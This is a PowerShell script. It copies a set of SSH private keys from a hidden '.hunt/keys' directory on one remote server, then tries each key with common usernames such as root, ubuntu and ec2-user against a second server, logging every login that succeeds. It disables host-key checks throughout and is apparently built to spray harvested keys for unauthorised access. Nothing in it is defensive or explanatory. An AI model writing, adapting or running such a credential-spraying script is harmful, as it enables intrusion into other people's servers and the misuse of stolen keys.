Set-Location 'c:\Users\Patrick\OneDrive\Desktop\test1'
$out = 'c:\Users\Patrick\OneDrive\Desktop\test1\_b2hit.txt'
"start $(Get-Date)" | Set-Content $out
if (-not (Test-Path 'b2keys')) { New-Item -ItemType Directory 'b2keys' | Out-Null }
if ((Get-ChildItem 'b2keys' -File | Measure-Object).Count -eq 0) {
  & scp.exe -i id_key -r -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL 'root@167.233.74.146:/tmp/.sysd/.hunt/keys/*' b2keys/ 2>$null
}
$ks = Get-ChildItem 'b2keys' -File
"keyfiles=$($ks.Count)" | Add-Content $out
foreach ($k in $ks) {
  foreach ($u in @('root','ubuntu','admin','debian','ec2-user')) {
    $r = (& ssh.exe -i $k.FullName -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o IdentitiesOnly=yes -o LogLevel=ERROR -o ConnectTimeout=4 "$u@5.161.247.9" echo IN_OK 2>&1) -join ' '
    if ($r -match 'IN_OK') { "OPEN $u <= $($k.Name)" | Add-Content $out }
  }
  "tried $($k.Name)" | Add-Content $out
}
"DONE $(Get-Date)" | Add-Content $out
